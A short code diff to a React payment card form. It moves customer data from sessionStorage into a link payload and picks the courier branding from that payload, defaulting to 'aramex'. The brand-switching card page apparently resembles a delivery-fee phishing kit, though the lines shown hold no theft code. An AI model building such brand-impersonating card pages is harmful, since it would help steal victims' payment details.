@@ -21,9 +21,9 @@ const PaymentCardForm = () => {
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
-  
-  // Get customer info from sessionStorage
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
+
+  // Get customer info from link data (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
